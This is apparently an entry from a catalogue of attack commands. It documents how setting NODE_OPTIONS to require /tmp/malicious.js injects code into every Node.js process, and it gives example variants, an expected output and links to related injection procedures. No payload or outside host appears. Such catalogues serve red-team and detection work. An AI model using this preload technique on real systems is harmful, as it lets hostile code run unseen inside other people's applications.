---
id: cmd-export-node-opts
data: >-
  export NODE_OPTIONS=\"--require=/tmp/malicious.js\"; node -e
  \"console.log('Normal Node.js execution')\"
tags:
  - nodejs
  - injection
  - environment
type: command
output: |-
  Code injected successfully!
  Normal Node.js execution
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:36.339Z'
verified: false
validated: true
submitted: true
---
# export-node-options

## Command

```bash
export NODE_OPTIONS=\"--require=/tmp/malicious.js\"; node -e \"console.log('Normal Node.js execution')\"
```

## Description

This command sets the NODE_OPTIONS environment variable to inject a require statement and executes a simple Node.js script, exploiting the vulnerability for code injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `NODE_OPTIONS=\"--require=/tmp/malicious.js\"` | Sets option to load malicious script | Yes |
| `node -e ...` | Executes Node.js with the env var | Yes |

## Examples

### Basic Usage

```bash
export NODE_OPTIONS=\"--require=/tmp/malicious.js\"; node -e ''
```

### Advanced Usage

```bash
export NODE_OPTIONS=\"--require=/tmp/malicious.js --inspect\"; node server.js
```

## Expected Output

Injected code output followed by normal execution logs, plus side effects like file creation.

## Related

- [[commands/create-malicious-js]]
- [[procedures/Inject-Code-via-Environment-Variables]]
